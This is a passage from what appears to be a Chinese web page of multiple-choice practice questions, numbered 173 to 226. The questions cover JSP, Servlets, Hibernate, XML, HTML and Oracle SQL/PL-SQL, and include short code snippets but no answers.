对象</strong></p></blockquote><h3 id="173-考虑下面-JSP-文件代码片断："><a href="#173-考虑下面-JSP-文件代码片断：" class="headerlink" title="173. 考虑下面 JSP 文件代码片断："></a>173. 考虑下面 JSP 文件代码片断：</h3><pre><code>&lt;HTML&gt;    &lt;BODY&gt;        &lt;jsp:include page="test2.jsp"&gt;        &lt;jsp:param name="username" value="accp"/&gt;        &lt;/jsp:include&gt;    &lt;/BODY&gt;&lt;/HTML&gt;</code></pre><p>以下（ ）代码片断放置在 test2.jsp 中不会导致错误。</p><blockquote><p><strong>A <code>&lt;jsp:getParam name="username"/&gt;</code></strong><br><strong>B <code>&lt;jsp:include param ="username"/&gt;</code></strong><br><strong>C <code>&lt;%=request.getParameter("username")%&gt;</code></strong><br><strong>D <code>&lt;%=request.getAttribute("username")%&gt;</code></strong></p></blockquote><h3 id="174-以下是-login-jsp-文件的代码片断："><a href="#174-以下是-login-jsp-文件的代码片断：" class="headerlink" title="174.以下是 login.jsp 文件的代码片断："></a>174.以下是 login.jsp 文件的代码片断：</h3><pre><code>&lt;%@ page isELIgnored="false"%&gt;&lt;html&gt;    &lt;body&gt;        &lt;FORM action="login.jsp" method="GET"&gt;             &lt;input type="text" name="name" value="${param['name']}"&gt;             &lt;input type="submit" value="提交"&gt;        &lt;/FORM&gt;         &lt;P&gt;        用户名为: ${param.name}    &lt;/body&gt;&lt;/html&gt;</code></pre><p>以下（ ）描述正确。</p><blockquote><p><strong>A 发生运行错误</strong><br><strong>B 页面会出现一文本框，并且文本框中内容为${param[‘name’]}</strong><br><strong>C 当用户输入名字并单击”提交”按钮时，在同一页面中的”用户名为：”字样后面会显示用户输入<br>的内容</strong><br><strong>D 当用户输入名字并单击”提交”按钮时，在同一页面中的”用户名为：”字样后面会显示${param.name}</strong></p></blockquote><h3 id="175．doAfterBody-方法是在（-）接口中定义的。"><a href="#175．doAfterBody-方法是在（-）接口中定义的。" class="headerlink" title="175．doAfterBody()方法是在（ ）接口中定义的。"></a>175．doAfterBody()方法是在（ ）接口中定义的。</h3><blockquote><p><strong>A Tag</strong><br><strong>B IterationTag</strong><br><strong>C BodyTag</strong><br><strong>D TagSupport</strong></p></blockquote><h3 id="176-下面代码片断在浏览器中输出结果为（-）。"><a href="#176-下面代码片断在浏览器中输出结果为（-）。" class="headerlink" title="176.下面代码片断在浏览器中输出结果为（ ）。"></a>176.下面代码片断在浏览器中输出结果为（ ）。</h3><pre><code>&lt;c:set var="myVar" scope ="session"&gt;2+3&lt;/c:set&gt;&lt;c:out value="${myVar}"/&gt;</code></pre><blockquote><p><strong>A 0</strong><br><strong>B 5</strong><br><strong>C 2+3</strong><br><strong>D 无输出</strong></p></blockquote><h3 id="177-编写一个-Filter，除继承-HttpServlet-类外还需要（-）。"><a href="#177-编写一个-Filter，除继承-HttpServlet-类外还需要（-）。" class="headerlink" title="177.编写一个 Filter，除继承 HttpServlet 类外还需要（ ）。"></a>177.编写一个 Filter，除继承 HttpServlet 类外还需要（ ）。</h3><blockquote><p><strong>A 继承 Filter 类</strong><br><strong>B 实现 Filter 接口</strong><br><strong>C 继承 HttpFilter 类</strong><br><strong>D 实现 HttpFilter 接口</strong></p></blockquote><h3 id="178-以下哪个-Hibernate-主键生成策略是实现主键按数值顺序递增的？"><a href="#178-以下哪个-Hibernate-主键生成策略是实现主键按数值顺序递增的？" class="headerlink" title="178.以下哪个 Hibernate 主键生成策略是实现主键按数值顺序递增的？"></a>178.以下哪个 Hibernate 主键生成策略是实现主键按数值顺序递增的？</h3><blockquote><p><strong>A increment</strong><br><strong>B identity</strong><br><strong>C sequence</strong><br><strong>D native</strong></p></blockquote><h3 id="179-在-jsp-中，page-指令的（）属性用来引入需要的包或类。"><a href="#179-在-jsp-中，page-指令的（）属性用来引入需要的包或类。" class="headerlink" title="179.在 jsp 中，page 指令的（）属性用来引入需要的包或类。"></a>179.在 jsp 中，page 指令的（）属性用来引入需要的包或类。</h3><blockquote><p>**A extends **<br><strong>B import</strong><br><strong>C language</strong><br><strong>D contentType</strong></p></blockquote><h3 id="180-正则表达式”-d-d-”在匹配下列字符串时结果是失败的是？"><a href="#180-正则表达式”-d-d-”在匹配下列字符串时结果是失败的是？" class="headerlink" title="180.正则表达式”\d+.?\d*”在匹配下列字符串时结果是失败的是？"></a>180.正则表达式”\d+.?\d*”在匹配下列字符串时结果是失败的是？</h3><blockquote><p><strong>A 12.5</strong><br><strong>B 1.25</strong><br><strong>C 以上都成功</strong><br><strong>D 以上都失败</strong></p></blockquote><h3 id="181-下列没有直接采用-XML-技术的是（-）"><a href="#181-下列没有直接采用-XML-技术的是（-）" class="headerlink" title="181.下列没有直接采用 XML 技术的是（ ）"></a>181.下列没有直接采用 XML 技术的是（ ）</h3><blockquote><p><strong>A UDDI</strong><br><strong>B SOAP</strong><br><strong>C AJAX</strong><br><strong>D DCOM</strong></p></blockquote><h3 id="182-下列可以用来解析-XML-的是（-）"><a href="#182-下列可以用来解析-XML-的是（-）" class="headerlink" title="182.下列可以用来解析 XML 的是（ ）"></a>182.下列可以用来解析 XML 的是（ ）</h3><blockquote><p><strong>A CSS</strong><br><strong>B DTD</strong><br><strong>C SAX</strong><br><strong>D XSL</strong></p></blockquote><h3 id="183-下面关于-XML-叙述不正确的是（-）"><a href="#183-下面关于-XML-叙述不正确的是（-）" class="headerlink" title="183.下面关于 XML 叙述不正确的是（ ）"></a>183.下面关于 XML 叙述不正确的是（ ）</h3><blockquote><p><strong>A XML 标记必须关闭</strong><br><strong>B XML 是大小写敏感的</strong><br><strong>C XML 文件只能跟 DTD 文件一块使用</strong><br><strong>D XML 和 XSL 结合可以在浏览器上显示</strong></p></blockquote><h3 id="184-在不指定特殊属性的情况下，哪几种-HTML-标签可以手动输入文本：（）"><a href="#184-在不指定特殊属性的情况下，哪几种-HTML-标签可以手动输入文本：（）" class="headerlink" title="184.在不指定特殊属性的情况下，哪几种 HTML 标签可以手动输入文本：（）"></a>184.在不指定特殊属性的情况下，哪几种 HTML 标签可以手动输入文本：（）</h3><blockquote><p><strong>A <code>&lt;TEXTAREA&gt;&lt;/TEXTAREA&gt;</code></strong><br><strong>B <code>&lt;INPUT type="text"/&gt;</code></strong><br><strong>C <code>&lt;INPUT type="hidden"/&gt;</code></strong><br><strong>D <code>&lt;DIV&gt;&lt;/DIV&gt;</code></strong></p></blockquote><h3 id="185-关于-IFrame-表述正确的有："><a href="#185-关于-IFrame-表述正确的有：" class="headerlink" title="185.关于 IFrame 表述正确的有：()"></a>185.关于 IFrame 表述正确的有：()</h3><blockquote><p><strong>A 通过 IFrame，网页可以嵌入其他网页内容，并可以动态更改</strong><br><strong>B 在相同域名下，内嵌的 IFrame 可以获取外层网页的对象</strong><br><strong>C 在相同域名下，外层网页脚本可以获取 IFrame 网页内的对象</strong><br><strong>D 可以通过脚本调整 IFrame 的大小</strong></p></blockquote><h3 id="186-关于表格表述正确的有：（）"><a href="#186-关于表格表述正确的有：（）" class="headerlink" title="186.关于表格表述正确的有：（）"></a>186.关于表格表述正确的有：（）</h3><blockquote><p><strong>A 表格中可以包含 TBODY 元素</strong><br><strong>B 表格中可以包含 CAPTION 元素</strong><br><strong>C 表格中可以包含多个 TBODY 元素</strong><br><strong>D 表格中可以包含 COLGROUP 元素<br>E 表格中可以包含 COL 元素</strong></p></blockquote><h3 id="187-在-DHTML-中把整个文档的各个元素作为对象处理的技术是：（）"><a href="#187-在-DHTML-中把整个文档的各个元素作为对象处理的技术是：（）" class="headerlink" title="187.在 DHTML 中把整个文档的各个元素作为对象处理的技术是：（）"></a>187.在 DHTML 中把整个文档的各个元素作为对象处理的技术是：（）</h3><blockquote><p><strong>A HTML</strong><br><strong>B CSS</strong><br><strong>C DOM</strong><br><strong>D Script(脚本语言)</strong></p></blockquote><h3 id="188-下面属于-javascript-对象的有："><a href="#188-下面属于-javascript-对象的有：" class="headerlink" title="188.下面属于 javascript 对象的有：( )"></a>188.下面属于 javascript 对象的有：( )</h3><blockquote><p><strong>A Window</strong><br><strong>B Document</strong><br><strong>C Form</strong><br><strong>D String<br>E Navigator</strong></p></blockquote><h3 id="189-Servlet-程序的入口点是？（-）"><a href="#189-Servlet-程序的入口点是？（-）" class="headerlink" title="189.Servlet 程序的入口点是？（ ）"></a>189.Servlet 程序的入口点是？（ ）</h3><blockquote><p><strong>A init（）</strong><br><strong>B main（）</strong><br><strong>C service（）</strong><br><strong>D doGet（）</strong></p></blockquote><h3 id="190-不能在不同用户之间共享数据的方法是？（-）"><a href="#190-不能在不同用户之间共享数据的方法是？（-）" class="headerlink" title="190.不能在不同用户之间共享数据的方法是？（ ）"></a>190.不能在不同用户之间共享数据的方法是？（ ）</h3><blockquote><p><strong>A 通过 cookie</strong><br><strong>B 利用文件系统</strong><br><strong>C 利用数据库</strong><br><strong>D 通过 ServletContext 对象</strong></p></blockquote><h3 id="191-模块内聚度越高，说明模块内各成分彼此结合的程度越"><a href="#191-模块内聚度越高，说明模块内各成分彼此结合的程度越" class="headerlink" title="191. 模块内聚度越高，说明模块内各成分彼此结合的程度越"></a>191. 模块内聚度越高，说明模块内各成分彼此结合的程度越</h3><blockquote><p><strong>A 松散</strong><br><strong>B 紧密</strong><br><strong>C 无法判断</strong><br><strong>D 相同</strong></p></blockquote><h3 id="192-软件需求分析阶段的输出主要是"><a href="#192-软件需求分析阶段的输出主要是" class="headerlink" title="192 软件需求分析阶段的输出主要是"></a>192 软件需求分析阶段的输出主要是</h3><blockquote><p><strong>A 需求说明书</strong><br><strong>B 开发计划</strong><br><strong>C 可行性报告</strong><br><strong>D 设计说明书</strong></p></blockquote><h3 id="193-以下选项中不是项目经理的职责的是？"><a href="#193-以下选项中不是项目经理的职责的是？" class="headerlink" title="193. 以下选项中不是项目经理的职责的是？"></a>193. 以下选项中不是项目经理的职责的是？</h3><blockquote><p><strong>A 需求分析</strong><br><strong>B 计划</strong><br><strong>C 计划跟踪</strong><br><strong>D 质量管理</strong></p></blockquote><h3 id="194-配置管理能起到以下哪些作用？"><a href="#194-配置管理能起到以下哪些作用？" class="headerlink" title="194. 配置管理能起到以下哪些作用？"></a>194. 配置管理能起到以下哪些作用？</h3><blockquote><p><strong>A 版本管理</strong><br><strong>B 变更管理</strong><br><strong>C 需求管理</strong><br><strong>D 测试管理</strong></p></blockquote><h3 id="195-下面的哪个方法在-servlet-的-response-的输出流在-URL-中保存-Session-ID。（-）"><a href="#195-下面的哪个方法在-servlet-的-response-的输出流在-URL-中保存-Session-ID。（-）" class="headerlink" title="195.下面的哪个方法在 servlet 的 response 的输出流在 URL 中保存 Session ID。（ ）"></a>195.下面的哪个方法在 servlet 的 response 的输出流在 URL 中保存 Session ID。（ ）</h3><blockquote><p><strong>A The encodeURL method of the HttpServletRequest interface.</strong><br><strong>B The encodeURL method of the HttpServletResponse interface.</strong><br><strong>C The rewriteURL method of the HttpServletRequest interface.</strong><br><strong>D The rewriteURL method of the HttpServletResponse interface.</strong></p></blockquote><h3 id="196-看下面这个类"><a href="#196-看下面这个类" class="headerlink" title="196.看下面这个类"></a>196.看下面这个类</h3><pre><code>public class IfAttributsChanged implements ServletContextAttributeListener {    public void attributeAdded(ServletContextAttributeEvent scab) {        System.out.println("加入一个属性");    }    public void attributeRemoved(ServletContextAttributeEvent scab) {        System.out.println("删除一个属性");    }}</code></pre><p>关于 IfAttributsChanged 类的叙述，下列哪一个为真？(选择 1 项)</p><blockquote><p><strong>A 此类可以成功编译</strong><br><strong>B 此类无法成功编译，原因是缺少 attributeChanged()方法。</strong><br><strong>C 此类无法成功编译，原因是缺少 attributeReplaced()方法。</strong><br><strong>D 此类无法成功编译，原因是缺少 attributeUpdated()方法。</strong></p></blockquote><h3 id="197-Oracle-数据库表空间与用户的关系是"><a href="#197-Oracle-数据库表空间与用户的关系是" class="headerlink" title="197.Oracle 数据库表空间与用户的关系是 ( )?"></a>197.Oracle 数据库表空间与用户的关系是 ( )?</h3><blockquote><p><strong>A 一对一</strong><br><strong>B 一对多</strong><br><strong>C 多对一</strong><br><strong>D 多对多</strong></p></blockquote><h3 id="198-Oracle-数据库表空间与数据文件的关系描述正确的是"><a href="#198-Oracle-数据库表空间与数据文件的关系描述正确的是" class="headerlink" title="198.Oracle 数据库表空间与数据文件的关系描述正确的是( )"></a>198.Oracle 数据库表空间与数据文件的关系描述正确的是( )</h3><blockquote><p><strong>A 一个表空间只能对应一个数据文件</strong><br><strong>B 一个表空间可以对应多个数据文件</strong><br><strong>C 一个数据文件可以对应多个表空间</strong><br><strong>D 表空间与数据文件没任何对应关系</strong></p></blockquote><h3 id="199-判断这-PL-x2F-SQL-代码块："><a href="#199-判断这-PL-x2F-SQL-代码块：" class="headerlink" title="199.判断这 PL/SQL 代码块："></a>199.判断这 PL/SQL 代码块：</h3><pre><code>BEGINFOR i IN 1..6 LOOPIF i = 2 OR i = 3 THEN null;ELSEINSERT INTO example(one) VALUES (i);END IF;ROLLBACK;END LOOP;COMMIT;END;</code></pre><p>有多少行被插入到表 EXAMPLE ?</p><blockquote><p><strong>A 0</strong><br><strong>B 1</strong><br><strong>C 2</strong><br><strong>D 3</strong></p></blockquote><h3 id="200-你判断下面语句，有什么作用？"><a href="#200-你判断下面语句，有什么作用？" class="headerlink" title="200.你判断下面语句，有什么作用？"></a>200.你判断下面语句，有什么作用？</h3><p>GRANT update ON inventory TO joe WITH GRANT OPTION;</p><blockquote><p><strong>A 一个系统权限被授予用户 JOE</strong><br><strong>B 一个对象权限被授予用户 JOE</strong><br><strong>C 用户 JOE 被授予在这个对象上的所有权限</strong><br><strong>D 一个系统权限和一个对象权限被授予用户 JOE</strong></p></blockquote><h3 id="201-表-CLASSES-和-表-SCHEDULE-结构如下"><a href="#201-表-CLASSES-和-表-SCHEDULE-结构如下" class="headerlink" title="201.表 CLASSES 和 表 SCHEDULE 结构如下:"></a>201.表 CLASSES 和 表 SCHEDULE 结构如下:</h3><pre><code>CLASSES：ID NUMBER(9)CLASS_NAME VARCHAR2(20)TEACHER_ID NUMBER(9)SCHEDULE：CLASS_TIME DATECLASS_ID NUMBER(9)</code></pre><p>你建一个视图显示每一课的课名、课时，并按教师 ID 排序，判断下面语句将返回何种结果？ </p><pre><code>CREATE VIEW class_schedule AS SELECT C class_name, s.class_time FROM classes c, schedule s WHERE C id = s.class_id;</code></pre><blockquote><p><strong>A .语句创建视图 CLASS_SCHEDULE 且可产生预期结果.</strong><br><strong>B .语句创建视图 CLASS_SCHEDULE 但不能产生预期结果.</strong><br><strong>C .语法错误，因为视图不可基于连接查询.</strong><br><strong>D .语法错，因为语句未包含 ORDER BY 子句.</strong></p></blockquote><h3 id="202-Oracle-数据库中，在-SQL-语句中连接字符串的方法是哪个？"><a href="#202-Oracle-数据库中，在-SQL-语句中连接字符串的方法是哪个？" class="headerlink" title="202.Oracle 数据库中，在 SQL 语句中连接字符串的方法是哪个？"></a>202.Oracle 数据库中，在 SQL 语句中连接字符串的方法是哪个？</h3><blockquote><p><strong>A cat</strong><br><strong>B concat</strong><br><strong>C join</strong><br><strong>D +</strong></p></blockquote><h3 id="203-表-TEACHER-包含如下字段："><a href="#203-表-TEACHER-包含如下字段：" class="headerlink" title="203.表 TEACHER 包含如下字段："></a>203.表 TEACHER 包含如下字段：</h3><p>列名 可为空否？ 数据类型</p><pre><code>TEACHER_ID NOT NULL NUMBER(9)NAME VARCHAR2(25)SALARY NUMBER(7,2)SUBJECT_ID NOT NULL NUMBER(3)SUBJECT_DESCRIPTION VARCHAR2(2)</code></pre><p>你需要将理科教师的工资上浮 8%，理科教师的 SUBJECT_ID 是 011，你需用哪一句实现? </p><blockquote><p><strong>A UPDATE teacher SET salary = salary * 1.08 WHERE subject_description LIKE ‘SCIENCE’</strong><br><strong>B UPDATE teacher SET salary = salary * .08 WHERE subject_description LIKE ‘SCIENCE’ AND subject_id = 011</strong><br><strong>C UPDATE teacher SET salary = salary * 1.08 WHERE subject_id = 011;</strong><br><strong>D UPDATE teacher SET salary = salary + (salary * .08) WHERE subject_description LIKE ‘SCIENCE’ OR subject_id = 011</strong></p></blockquote><h3 id="204-定义游标如下："><a href="#204-定义游标如下：" class="headerlink" title="204.定义游标如下："></a>204.定义游标如下：</h3><pre><code>DECLARECURSOR query_cursor(v_salary) ISSELECT last_name, salary, dept_noFROM employeeWHERE salary&gt;v_salary;</code></pre><p>这条语句为什么会错误？</p><blockquote><p><strong>A 在游标定义中不允许出现 where 子句</strong><br><strong>B select 语句中缺少 into 子句</strong><br><strong>C 参数未指定为变量数据类型</strong><br><strong>D 定义 cursor 的语法写错了</strong></p></blockquote><h3 id="205-在-PL-x2F-SQL-块的哪部分可以对初始变量赋予新值"><a href="#205-在-PL-x2F-SQL-块的哪部分可以对初始变量赋予新值" class="headerlink" title="205.在 PL/SQL 块的哪部分可以对初始变量赋予新值?"></a>205.在 PL/SQL 块的哪部分可以对初始变量赋予新值?</h3><blockquote><p><strong>A 结尾部分</strong><br><strong>B 开头部分</strong><br><strong>C 执行部分</strong><br><strong>D 声明部分</strong></p></blockquote><h3 id="206-哪句可以实现显示-id-和-description-，条件满足订单时间在-January-1-1997-以前的，且单价小于-1-00-或者大于-5-00-的，结果用订单时间降序排列。"><a href="#206-哪句可以实现显示-id-和-description-，条件满足订单时间在-January-1-1997-以前的，且单价小于-1-00-或者大于-5-00-的，结果用订单时间降序排列。" class="headerlink" title="206.哪句可以实现显示 id 和 description ，条件满足订单时间在 January 1, 1997 以前的，且单价小于 1.00 或者大于 5.00 的，结果用订单时间降序排列。"></a>206.哪句可以实现显示 id 和 description ，条件满足订单时间在 January 1, 1997 以前的，且单价小于 1.00 或者大于 5.00 的，结果用订单时间降序排列。</h3><blockquote><p><strong>A SELECT id_number, description FROM inventory WHERE price IN (1.00, 5.00) OR order_date &lt; ‘01-JAN-97’ ORDER BY order_date DESC;**<br>**B SELECT id_number, description FROM inventory WHERE price BETWEEN 1.00 AND 5.00 OR order_date &lt; ‘01-JAN-1997’ ORDER BY order_date;**<br>**C SELECT id_number, description FROM inventory WHERE price &lt; 1.00 OR price &gt; 5.00 AND order_date &lt; ‘01 -Jan-97’ ORDER BY order_date ASC;**<br>**D SELECT id_number, description FROM inventory WHERE (price &lt;1.00 OR price &gt; 5.00) AND order_date &lt; ‘01-JAN-1997’ ORDER BY order_date DESC;</strong></p></blockquote><h3 id="207-判断下面句子，将返回什么值？"><a href="#207-判断下面句子，将返回什么值？" class="headerlink" title="207.判断下面句子，将返回什么值？"></a>207.判断下面句子，将返回什么值？</h3><p>SELECT id_number, description, price FROM inventory WHERE manufacturer_id IN (SELECT manufacturer_id FROM inventory WHERE price &gt; 8.00 OR quantity &gt; 1000);</p><blockquote><p><strong>A 返回单价大于 8.00 且数量大于 1000 的存货的 货号、种类、单价信息</strong><br><strong>B 返回单价大于 8.00 或者数量大于 1000 的存货的 货号、种类、单价信息.</strong><br><strong>C 返回单价大于 8.00 或者数量大于 1000 且有制造商号的存货的 货号、种类、单价信息.</strong><br><strong>D 返回单价大于 8.00 或者数量大于 1000 的制造商的所有存货的 货号、种类、单价信息.</strong></p></blockquote><h3 id="208-考虑下列声明，那些是不合法的："><a href="#208-考虑下列声明，那些是不合法的：" class="headerlink" title="208.考虑下列声明，那些是不合法的："></a>208.考虑下列声明，那些是不合法的：</h3><blockquote><p><strong>A DECLARE v_name, v_dept VARCHAR2(14);</strong><br><strong>B DECLARE v_test NUMBER(5);</strong><br><strong>C DECLARE V_MAXSALARY NUMBER(7, 2) = 5000;</strong><br><strong>D DECLARE V_JOINDATE BOOLEAN := SYSDATE;</strong></p></blockquote><h3 id="209-关于-PL-x2F-SQL-块的执行部分下列说法正确的是？"><a href="#209-关于-PL-x2F-SQL-块的执行部分下列说法正确的是？" class="headerlink" title="209.关于 PL/SQL 块的执行部分下列说法正确的是？"></a>209.关于 PL/SQL 块的执行部分下列说法正确的是？</h3><blockquote><p><strong>A PL/SQL 表达式可以包含分组函数.</strong><br><strong>B PL/SQL 表达式不可以包含 SQL 函数.</strong><br><strong>C 在 SQL 语句中部分分组函数可用.</strong><br><strong>D 以上都不对</strong></p></blockquote><h3 id="210-表（TEACHER）包含以下列："><a href="#210-表（TEACHER）包含以下列：" class="headerlink" title="210.表（TEACHER）包含以下列："></a>210.表（TEACHER）包含以下列：</h3><pre><code>ID NUMBER(7) PKSALARY NUMBER(7,2)SUBJECT_ID NUMBER(7)</code></pre><p>判断以下两个 SQL 语句：<br>（1）SELECT ROUND(SUM(salary),-2) FROM teacher ;<br>（2）SELECT subject_id, ROUND(SUM(salary),-2) FROM teacher GROUP BY subject_id ;</p><p>有什么不同结果? </p><blockquote><p><strong>A 语句 1 将返回每个老师一个结果</strong><br><strong>B 语句 2 将返回多个结果</strong><br><strong>C 结果相同，显示不同</strong><br><strong>D 将有一个句子产生错误</strong></p></blockquote><h3 id="211-游标的哪一种属性指示-fetch-语句是否从活动集中返回行，如未能返回行，则此属性的值为-true-？"><a href="#211-游标的哪一种属性指示-fetch-语句是否从活动集中返回行，如未能返回行，则此属性的值为-true-？" class="headerlink" title="211.游标的哪一种属性指示 fetch 语句是否从活动集中返回行，如未能返回行，则此属性的值为 true ？"></a>211.游标的哪一种属性指示 fetch 语句是否从活动集中返回行，如未能返回行，则此属性的值为 true ？</h3><blockquote><p><strong>A %FOUND</strong><br><strong>B %NOTFOUND</strong><br><strong>C %ROWCOUNT</strong><br><strong>D %ISOPEN</strong></p></blockquote><h3 id="212-哪一子句可实现-SELECT-语句查询员工平均工资小于-5000-的部门信息"><a href="#212-哪一子句可实现-SELECT-语句查询员工平均工资小于-5000-的部门信息" class="headerlink" title="212.哪一子句可实现 SELECT 语句查询员工平均工资小于 5000 的部门信息 ?"></a>212.哪一子句可实现 SELECT 语句查询员工平均工资小于 5000 的部门信息 ?</h3><blockquote><p><strong>A GROUP BY dept_id WHERE AVG(sal) &lt; 5000</strong><br><strong>B GROUP BY AVG(sal) HAVING AVG(sal) &lt; 5000</strong><br><strong>C GROUP BY dept_id HAVING AVG(sal) &lt; 5000</strong><br><strong>D GROUP BY AVG(sal) &lt; 5000</strong></p></blockquote><h3 id="213-在-PL-x2F-SQL-中使用哪几种语句来对变量进行赋值？"><a href="#213-在-PL-x2F-SQL-中使用哪几种语句来对变量进行赋值？" class="headerlink" title="213.在 PL/SQL 中使用哪几种语句来对变量进行赋值？"></a>213.在 PL/SQL 中使用哪几种语句来对变量进行赋值？</h3><blockquote><p><strong>A ：=</strong><br><strong>B SELECT INTO</strong><br><strong>C FETCH INTO</strong><br><strong>D =</strong></p></blockquote><h3 id="214-你试图用下面句子查询数据："><a href="#214-你试图用下面句子查询数据：" class="headerlink" title="214.你试图用下面句子查询数据："></a>214.你试图用下面句子查询数据：</h3><pre><code>SELECT 100/NVL(quantity, 0) FROM inventory;</code></pre><p>为何 QUANTITY 为 null 空值时，将导致出错？</p><blockquote><p><strong>A 表达式企图被空值除.</strong><br><strong>B 换函数参数数据类型不一致.</strong><br><strong>C 空值不能被转成实际值</strong><br><strong>D 表达式企图被零除.</strong></p></blockquote><h3 id="215-PL-x2F-SQL-的哪一部分实现对数据的操作"><a href="#215-PL-x2F-SQL-的哪一部分实现对数据的操作" class="headerlink" title="215.PL/SQL 的哪一部分实现对数据的操作?"></a>215.PL/SQL 的哪一部分实现对数据的操作?</h3><blockquote><p><strong>A 头部分</strong><br><strong>B 列外部分</strong><br><strong>C 执行部分</strong><br><strong>D 声明部分</strong></p></blockquote><h3 id="216-下列哪个集合操作符返回两个查询所选择的所有的行。"><a href="#216-下列哪个集合操作符返回两个查询所选择的所有的行。" class="headerlink" title="216 下列哪个集合操作符返回两个查询所选择的所有的行。"></a>216 下列哪个集合操作符返回两个查询所选择的所有的行。</h3><blockquote><p><strong>A Union</strong><br><strong>B Union all</strong><br><strong>C Union only</strong><br><strong>D connect by</strong></p></blockquote><h3 id="217-在-Oracle-中，当需要使用显式游标更新或删除游标中的行时，UPDATE-或-DELETE-语句必须使用（）子句。"><a href="#217-在-Oracle-中，当需要使用显式游标更新或删除游标中的行时，UPDATE-或-DELETE-语句必须使用（）子句。" class="headerlink" title="217.在 Oracle 中，当需要使用显式游标更新或删除游标中的行时，UPDATE 或 DELETE 语句必须使用（）子句。"></a>217.在 Oracle 中，当需要使用显式游标更新或删除游标中的行时，UPDATE 或 DELETE 语句必须使用（）子句。</h3><blockquote><p><strong>A WHERE CURRENT OF</strong><br><strong>B WHERE CURSOR OF</strong><br><strong>C FOR UPDATE</strong><br><strong>D FOR CURSOR OF</strong></p></blockquote><h3 id="218．在-Oracle-中，使用下列的语句："><a href="#218．在-Oracle-中，使用下列的语句：" class="headerlink" title="218．在 Oracle 中，使用下列的语句："></a>218．在 Oracle 中，使用下列的语句：</h3><pre><code>CREATE PUBLIC SYNONYM parts FOR Scott.inventory;</code></pre><p>完成的任务是（）。</p><blockquote><p><strong>A 将 Scott.inventory 对象的访问权限赋予所有用户</strong><br><strong>B 指定了新的对象权限</strong><br><strong>C 指定了新的系统权限</strong><br><strong>D 给 Scott.inventory 对象创建一个公用同义词 parts</strong></p></blockquote><h3 id="219-在-Oracle-中，执行如下-PL-x2F-SQL-语句后"><a href="#219-在-Oracle-中，执行如下-PL-x2F-SQL-语句后" class="headerlink" title="219.在 Oracle 中，执行如下 PL/SQL 语句后"></a>219.在 Oracle 中，执行如下 PL/SQL 语句后</h3><pre><code>CREATE TYPE car AS OBJECT ( id NUMBER, model VARCHAR2(25), color VARCHAR2(15) );DECLAREmyvar car.model%TYPE;BEGINEND;</code></pre><p>变量 myvar 的数据类型为（）。</p><blockquote><p><strong>A NUMBER</strong><br><strong>B car 类型</strong><br><strong>C VARCHAR2</strong><br><strong>D OBJECT</strong></p></blockquote><h3 id="220-有如下-SQL-片段"><a href="#220-有如下-SQL-片段" class="headerlink" title="220.有如下 SQL 片段"></a>220.有如下 SQL 片段</h3><p>a. select * from asdfh a where a.kehhao in (select kehhao from retail_vip )<br>b. select * from asdfh a where exists (select r. kehhao from retail_vip r where r.kehhao = a.kehhao)</p><p>则以下哪些描述是正确的：</p><blockquote><p><strong>A a,b 含义相同</strong><br><strong>B a 的效率高于 b</strong><br><strong>C b 的效率高于 a</strong><br><strong>D a,b 效率高低依赖于表 asdfh 和 kehhao 的结构<br>E a,b 效率高低需考虑表 asdfh 和 kehhao 的数据量</strong></p></blockquote><h3 id="221-有如下表结构"><a href="#221-有如下表结构" class="headerlink" title="221.有如下表结构"></a>221.有如下表结构</h3><p>客户号（kehhao）,日期（riqi）,账户余额(zhhuye)</p><p>说明表 a 中记录客户不同日期账户余额，但仅在相邻两天任一客户（kehhao）账户余额（zhhuye）发生变化时，才在表 a 中添加新记录。<br>日期(riqi)，其中包含多条日期：如 20050101，20050110 等<br>则如下 SQL 片段含义为：</p><p>Select a.kehhao,c.riqi,a.zhhuye (Select b.riqi as riqi , max(a.riqi) as riqix from b,a where a.riqi &lt;= b.riqi) c Left join a On a.riqi = C riqix</p><blockquote><p><strong>A 选择表 a 中各个客户在给定日期（给定日期由表 b 存储）的余额信息</strong><br><strong>B 选择表 a 中各个客户在除给定日期（给定日期由表 b 存储）的余额信息</strong><br><strong>C 选择表 a 中各个客户最接近给定日期（给定日期由表 b 存储）的余额信息</strong><br><strong>D 以上都不对</strong></p></blockquote><h3 id="222-有如下-SQL-片段"><a href="#222-有如下-SQL-片段" class="headerlink" title="222 有如下 SQL 片段"></a>222 有如下 SQL 片段</h3><pre><code>Delete from asdfh a where a.kaihrq &gt; '20091214' and a.jiluzt &lt;&gt; '1'</code></pre><p>其含义为：</p><blockquote><p><strong>A 从表 asdfh 中删除 kaihrq 不小于 2009 年 12 月 14 日，且 jiluzt 不为 1 的记录</strong><br><strong>B 从表 asdfh 中删除 kaihrq 和 jiluzt 列</strong><br><strong>C 对表 asdfh 中删除 kaihrq 不小于 2009 年 12 月 14 日，且 jiluzt 不为 1 的记录打删除标记</strong><br><strong>D 以上都不正确</strong></p></blockquote><h3 id="223-只有满足联接条件的记录才包含在查询结果中，这种联接为"><a href="#223-只有满足联接条件的记录才包含在查询结果中，这种联接为" class="headerlink" title="223.只有满足联接条件的记录才包含在查询结果中，这种联接为?"></a>223.只有满足联接条件的记录才包含在查询结果中，这种联接为?</h3><blockquote><p><strong>A 左联接</strong><br><strong>B 右联接</strong><br><strong>C 内部联接</strong><br><strong>D 完全联接</strong></p></blockquote><h3 id="224-分机构统计-VIP-客户的数量下面-SQL-语句正确的是？"><a href="#224-分机构统计-VIP-客户的数量下面-SQL-语句正确的是？" class="headerlink" title="224.分机构统计 VIP 客户的数量下面 SQL 语句正确的是？"></a>224.分机构统计 VIP 客户的数量下面 SQL 语句正确的是？</h3><p>其中<br>表 a：jigou(机构)，kehhao(客户号)，jiaoyrq(交易日期),jioyje(交易金额)<br>表 b: kehhao(客户号)，表 b 为 VIP 客户号表</p><pre><code>Select ______ from a inner join b on a.kehhao = b.kehhao ________</code></pre><blockquote><p><strong>A Count(a.kehhao), group by jigou</strong><br><strong>B Count(a.kehhao), order by jigou</strong><br><strong>C Sum(a.kehhao), order by jigou</strong><br><strong>D Count(a.kehhao), having jigou<br>E 以上都不正确</strong></p></blockquote><h3 id="225-SQL-语言中修改表结构的命令是？"><a href="#225-SQL-语言中修改表结构的命令是？" class="headerlink" title="225.SQL 语言中修改表结构的命令是？"></a>225.SQL 语言中修改表结构的命令是？</h3><blockquote><p><strong>A MODIFY TABLE</strong><br><strong>B MODIFY STRUCTURE</strong><br><strong>C ALTER TABLE</strong><br><strong>D ALTER STRUCTURE</strong></p></blockquote><h3 id="226-Delete-和-truncate-都可以用来删除表内容，一下描述正确的是？"><a href="#226-Delete-和-truncate-都可以用来删除表内容，一下描述正确的是？" class="headerlink" 